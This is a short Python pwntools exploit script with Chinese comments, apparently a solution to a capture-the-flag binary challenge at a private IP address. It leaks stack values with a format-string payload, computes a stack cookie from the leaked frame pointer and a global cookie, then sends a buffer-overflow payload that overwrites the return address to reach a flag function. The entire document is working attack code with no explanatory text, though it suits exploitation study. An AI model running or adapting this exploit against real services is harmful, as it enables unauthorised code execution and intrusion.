from pwn import *

r = remote('172.17.81.169', 9999)

GET_FLAG = 0x00401000
OFFSET_BUFFER_COOKIE = 256 + 64

# 读取banner，获取全局cookie
buffer = r.recvline().decode().split(' @ ')[1]
print(f"Buffer address: {buffer}")
global_cookie = r.recvline().decode().split(' : ')[1]
print(f"Global cookie: {global_cookie}")
global_cookie = int(global_cookie, 16)
r.recvuntil(b': ')

# 读取栈内容
payload = b'%p'* 31
r.sendline(payload)
stack = r.recvline().decode()
stack = [stack[i:i+8] for i in range(0, len(stack), 8)]
print(f"Stack content (split): {stack}")
r.recvuntil(b': ')
# 计算栈cookie
EBP = int(stack[0], 16)
print(f"EBP: {EBP}")
stack_cookie = global_cookie ^ EBP
print(f"Stack cookie: {stack_cookie}")
# 构造payload
payload = b'A' * OFFSET_BUFFER_COOKIE + p32(stack_cookie) + p32(0xdeadbeef) + p32(GET_FLAG)
r.sendline(payload)

try:
    data = r.recvall(timeout=5)
    log.info(f"Received:\n{data.decode(errors='replace')}")
except:
    data = r.recv(timeout=3)
    log.info(f"Received:\n{data.decode(errors='replace')}")